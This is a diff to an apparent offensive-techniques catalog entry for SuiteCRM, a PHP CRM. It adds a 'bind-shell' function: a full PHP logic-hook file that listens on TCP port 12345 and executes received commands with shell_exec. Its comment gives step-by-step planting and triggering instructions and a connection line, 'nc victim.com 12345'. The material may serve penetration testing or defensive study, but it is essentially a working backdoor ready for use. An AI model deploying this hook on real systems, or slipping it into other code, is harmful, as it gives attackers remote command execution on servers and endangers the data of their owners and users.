@@ -18,6 +18,40 @@ comment: "SuiteCRM is an open-source PHP CRM (fork of SugarCRM) widely deployed 
   \ and invoked automatically on\nrecord save, delete, and other lifecycle events.\
   \ No restart is required.\n"
 functions:
+  bind-shell:
+  - code: |
+      <?php
+      // Admin Logic Hook bind shell (Linux)
+      // Place in custom/Extension/modules/Contacts/Ext/LogicHooks/bs_hook.php
+      function bs_hook($bean, $event, $arguments) {
+          set_time_limit(0);
+          $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+          socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
+          socket_bind($sock, '0.0.0.0', 12345);
+          socket_listen($sock, 1);
+          $cli = socket_accept($sock);
+          while (true) {
+              $data = socket_read($cli, 65536, PHP_NORMAL_READ);
+              if (!$data) break;
+              $out = shell_exec(trim($data));
+              socket_write($cli, $out ?? '');
+          }
+          socket_close($cli);
+          socket_close($sock);
+      }
+      ?>
+    comment: |
+      Admin Logic Hook bind shell: the hook creates a TCP listener on port 12345 using
+      PHP's socket extension. socket_accept() blocks until a client connects, holding
+      the HTTP request thread for the duration of the session.
+      Register the hook in custom/modules/Contacts/logic_hooks.php, run Admin > Repair >
+      Quick Repair and Rebuild, then trigger by saving any Contact record.
+      Connect with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      admin:
+    platform: linux
+    tty: false
   file-read:
   - code: |
       <?php
